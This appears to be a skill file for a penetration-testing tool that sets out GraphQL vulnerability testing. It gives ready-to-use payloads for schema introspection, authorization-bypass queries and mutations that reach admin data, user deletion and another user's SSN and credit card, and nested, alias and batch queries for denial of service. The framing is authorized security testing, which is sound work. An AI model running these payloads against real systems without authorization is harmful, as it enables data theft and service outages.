---
name: attack-graphql
description: "GraphQL vulnerability testing — introspection exposure, complexity DoS, batch abuse, mutation auth bypass"
category: "web-application"
version: "1.0"
author: "cyberstrike-official"
tags:
  - graphql
  - api
  - web
  - dos
  - attack
tech_stack:
  - web
  - graphql
cwe_ids:
  - CWE-200
  - CWE-284
  - CWE-770
chains_with:
  - attack-idor-automation
prerequisites: []
severity_boost:
  attack-idor-automation: "GraphQL introspection reveals IDOR-vulnerable queries"
---

# GraphQL Vulnerability Testing

## Objective

Exploit GraphQL-specific vulnerabilities including schema exposure, query complexity abuse, and authorization bypass.

## Testing Methodology

### Phase 1: Automated Testing

```bash
# Full GraphQL test suite
attack_script graphql_tester "https://TARGET/graphql" \
  -H "Authorization:Bearer TOKEN" \
  --json-output

# Custom depth/batch
attack_script graphql_tester "https://TARGET/graphql" \
  --depth 15 --batch-count 100
```

### Phase 2: Introspection Query

```bash
# Full schema extraction
curl -s -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } mutationType { fields { name args { name type { name } } } } queryType { fields { name } } } }"}'
```

If introspection is enabled, map all types, queries, mutations, and subscriptions.

### Phase 3: Authorization Bypass

```graphql
# Access admin queries without auth
{ adminUsers { id email role } }

# Mutation without auth
mutation { deleteUser(id: "123") { success } }

# Access other user's data
{ user(id: "OTHER_USER_ID") { email ssn creditCard } }
```

### Phase 4: Complexity / DoS

```graphql
# Deeply nested query
{ users { posts { comments { author { posts { comments { author { id } } } } } } } }

# Alias multiplication
{ a1: __typename a2: __typename ... a100: __typename }

# Batch queries (array)
[{"query":"{ __typename }"}, {"query":"{ __typename }"}, ... x50]
```

### Phase 5: Directive Abuse

```graphql
# Skip/include directive for info leakage
{ user(id: "1") { name email @skip(if: false) secretField @include(if: true) } }

# Field suggestions (error-based enum)
{ user { nonExistentField } }
# Error may suggest: "Did you mean: password, secret_key?"
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Introspection enabled (schema exposed) | Medium (P3) |
| Admin mutations accessible without auth | Critical (P1) |
| Other user data accessible (IDOR) | High (P2) |
| DoS via complexity (server timeout/crash) | Medium (P3) |
| Batch queries bypass rate limiting | Medium (P3) |

## Evidence Requirements

- GraphQL endpoint URL
- Query/mutation sent
- Response showing unauthorized data
- For introspection: schema dump (types, mutations, queries)
- For DoS: response timing proving server overload

## Tools

- `attack_script graphql_tester` — automated introspection + DoS + batch testing

## References

- [PortSwigger: GraphQL](https://portswigger.net/web-security/graphql)
- [HackerOne: GraphQL Bugs](https://www.hackerone.com/vulnerability-management/graphql-security-guide)
